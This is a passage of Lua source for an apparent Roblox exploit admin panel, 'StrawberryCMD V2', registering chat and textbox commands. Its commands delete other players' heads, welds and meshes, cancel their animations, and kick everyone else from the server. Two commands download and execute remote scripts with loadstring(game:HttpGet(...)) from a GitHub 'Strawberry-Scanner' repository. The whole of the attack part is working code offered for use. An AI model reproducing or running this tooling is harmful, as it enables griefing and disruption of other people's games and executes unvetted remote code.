		desc = "Description coming soon!",
		code = function(string)
			local target = findtargets(string)
			target = target[1]
			for _, m in ipairs(target.Character:GetDescendants()) do
				if m:IsA("SpecialMesh") or m:IsA("MeshPart") then
					delete(m)
				end
			end
		end,
	},
	{
		name = "DeleteWeldsTool",
		desc = "Description coming soon!",
		code = function()
			local mouse = player:GetMouse()
			local equipped = false

			local tool = Instance.new("Tool",player:FindFirstChild("Backpack"))
			tool.Name = "Delete Welds Tool"
			tool.RequiresHandle = false

			tool.Equipped:Connect(function()
				equipped = true
			end)
			tool.Equipped:Connect(function()
				equipped = false
			end)

			tool.Activated:Connect(function()
				if not equipped then return end
				if mouse.Target then
					for _, v in ipairs(mouse.Target:GetDescendants()) do
						if v:IsA("Weld") then
							delete(v)
						end
					end
				end
			end)
		end,
	},
	{
		name = "KillTool",
		desc = "Description coming soon!",
		code = function()
			local mouse = player:GetMouse()
			local equipped = false

			local tool = Instance.new("Tool",player:FindFirstChild("Backpack"))
			tool.Name = "Kill Tool"
			tool.RequiresHandle = false

			tool.Equipped:Connect(function()
				equipped = true
			end)
			tool.Equipped:Connect(function()
				equipped = false
			end)

			tool.Activated:Connect(function()
				if not equipped then return end
				if mouse.Target then
					local ancestorparent = mouse.Target.Parent
					if ancestorparent:FindFirstChild("Head") then
						delete(ancestorparent:FindFirstChild("Head"))
					end
				end
			end)
		end,
	},
	{
		name = "Cmds",
		desc = "Description coming soon!",
		code = function()
			cmdlist.Visible = true
		end,
	},
	{
		name = "CopyPlrName",
		desc = "Description coming soon!",
		code = function()
			local mouse = player:GetMouse()

			local tool = Instance.new("Tool")
			tool.Name = "Copy User Tool"
			tool.RequiresHandle = false
			tool.Parent = player:WaitForChild("Backpack")

			local equipped = false

			tool.Equipped:Connect(function()
				equipped = true
			end)

			tool.Unequipped:Connect(function()
				equipped = false
			end)

			mouse.Button1Down:Connect(function()
				if not equipped then return end

				local target = mouse.Target
				if target then
					if target.Parent:FindFirstChild("Humanoid") then
						local plr = game.Players:GetPlayerFromCharacter(target.Parent)
						setclipboard(plr.Name) --Don't mind the syntax error
						toclipboard(plr.Name) --Don't mind the syntax error
					end
				end
			end)
		end,
	},
	{
		name = "Shutdown",
		desc = "Description coming soon!",
		code = function()
			for _, plr in pairs(players:GetPlayers()) do
				if plr ~= player then
					delete(plr)
				end
			end
			player:Kick("Game has been shutdown!")
		end,
	},
	{
		name = "CancelAnims",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				delete(plr.Character:FindFirstChild("Animate"))
			end
		end,
	},

	{
		name = "JohnDoe",
		desc = "Description coming soon!",
		code = function()
			notification("Loading John Doe script, please wait...",3)
			loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/reanims/johndoe.lua"))()
		end,
	},
	{
		name = "Thomas",
		desc = "Description coming soon!",
		code = function()
			notification("Loading Thomas script, please wait...",3)
			loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/reanims/thomasthedankengine.lua"))()
		end,
	},
}

for _, cmd in ipairs(commands) do
	local function addentry(name,desc)
		local newframe = Instance.new("Frame",scroll_cmdlist)
		newframe.Name = name
		newframe.Size = UDim2.new(1,0,0,40)
		newframe.BackgroundTransparency = 1
		local title_newframe = Instance.new("TextLabel",newframe)
		title_newframe.Name = "Title"
		title_newframe.Text = name
		title_newframe.Size = UDim2.new(1,0,0.5,0)
		title_newframe.BackgroundTransparency = 1
		title_newframe.Font = config.ui.font.bold
		title_newframe.TextColor3 = config.ui.text_color
		title_newframe.TextScaled = true
		title_newframe.TextWrapped = true
		local desc_newframe = Instance.new("TextLabel",newframe)
		desc_newframe.Name = "Description"
		desc_newframe.Text = desc
		desc_newframe.Size = UDim2.new(1,0,0.5,0)
		desc_newframe.Position = UDim2.new(0,0,0.5,0)
		desc_newframe.BackgroundTransparency = 1
		desc_newframe.Font = config.ui.font.normal
		desc_newframe.TextColor3 = config.ui.text_color
		desc_newframe.TextTransparency = 0.75
		desc_newframe.TextWrapped = true
		desc_newframe.TextSize = 14
	end
	addentry(cmd.name,cmd.desc)
	local function textchatcommands(name)
		local NewCommand = Instance.new("TextChatCommand")
		NewCommand.Parent = TTC
		NewCommand.Name = "RBX"..name
		NewCommand.PrimaryAlias = "/"..name
		NewCommand.SecondaryAlias = "/"..string.sub(name, 1,3)
		NewCommand.Enabled = true
		NewCommand.AutocompleteVisible = true
	end
	textchatcommands(cmd.name)
end

players.PlayerAdded:Connect(function(plr)
	if table.find(banned,plr) then
		delete(plr)
	end
end)

players.PlayerRemoving:Connect(function(plr)
	if not slock then return end
	if table.find(curpayers,plr) then
		table.remove(curpayers,table.find(curpayers,plr))
	end
end)
players.PlayerAdded:Connect(function(plr)
	if not slock then return end
	if not table.find(curpayers,plr) then
		delete(plr)
		notification("\""..plr.Name.."\" tried joining the game!")
	end
end)

textbox.FocusLost:Connect(function(enter)
	if enter and textbox.Text ~= "" then
		local text = textbox.Text:lower()
		local args = string.split(text, " ")
		local cmdname = args[1]

		table.remove(args, 1)

		for _, command in ipairs(commands) do
			if command.name:lower() == cmdname then
				command.code(unpack(args))
				return
			end
		end

		warn("StrawberryCMD V2 | Unknown command: "..cmdname)
		notification("Unknown command:\n"..cmdname,3)
	end
end)

for _, child in ipairs(TTC:GetChildren()) do
	task.spawn(function()
		if child:IsA("TextChatCommand") then
			child.Triggered:Connect(function(source, message)
				local args = string.split(message, " ")
				print(args)
				local cmdname = args[1]
				local cmd = string.sub(cmdname, 2)
				print(cmd)
				for _, command in ipairs(commands) do
					if string.find(cmd, command.name, 1, true) then
						print("triggered")
						command.code(args[2], if args[3] then args[3] else nil, if args[4] then args[4] else nil, if args[5] then args[5] else nil, if args[6] then args[6] else nil, if args[7] then args[7] else nil, if args[8] then args[8] else nil, if args[9] then args[9] else nil)
						return
					end
				end
			end)
		end
	end)
end
